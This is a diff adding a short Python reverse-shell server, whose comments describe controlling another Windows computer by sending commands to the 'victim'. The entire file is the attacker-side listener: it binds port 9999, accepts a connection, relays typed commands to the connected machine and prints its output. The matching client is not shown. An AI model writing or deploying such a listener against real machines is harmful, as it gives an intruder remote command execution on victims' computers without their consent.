@@ -1,0 +1,68 @@
+#Revserse shell Program server
+#We want to control another Windows computer through the server and give commands to the command window of the client or victim
+
+
+import socket       # imports socket
+import sys          # System-specific parameters and functions, used to capture command-line arguments given at a file's runtime
+
+
+# create a scoket (connect a computer)
+def create_socket():
+    try:
+        global host                                                      # to use it globally
+        global port
+        global s
+        host = ""
+        port = 9999
+        s = socket.socket()                                              # create a socket as s
+
+    except socket.error as msg:                                          # to catch errors and to print them
+        print("Socket creation error " + str(msg))
+
+
+# binding the socket and listening for connections
+
+def bind_socket():
+    try:
+        global host
+        global port
+        global s
+
+        print("Binding the Port " + str(port))
+        s.bind((host, port))
+        s.listen(5)
+
+    except socket.error as msg:
+        print("Socket creation error " + str(msg) + "\n" + "Retrying...")
+        bind_socket()       #Recursion
+
+#establish connection with client and the socket must be listening
+
+def socket_accept():
+    conn,addr = s.accept()
+    print("Connection has been established !!" + "| IP " + addr[0] + " |" + " PORT " + str(addr[1]) )
+    send_command(conn)
+    conn.close()
+
+#send commands to client
+
+def send_command(conn):
+    while True:
+        cmd=input()
+        if cmd == "quit" :            # quit command to end the socket
+            conn.close()
+            s.close()
+            sys.exit()
+        if len(str.encode(cmd)) >0 :                 # if there is some command 
+            conn.send(str.encode(cmd))
+            client_respone = str(conn.recv(1024),"utf-8")
+            print(client_respone, end="")            # end="" -> Used to go to next line
+
+
+def main() :
+    create_socket()
+    bind_socket()
+    socket_accept()
+
+
+main()
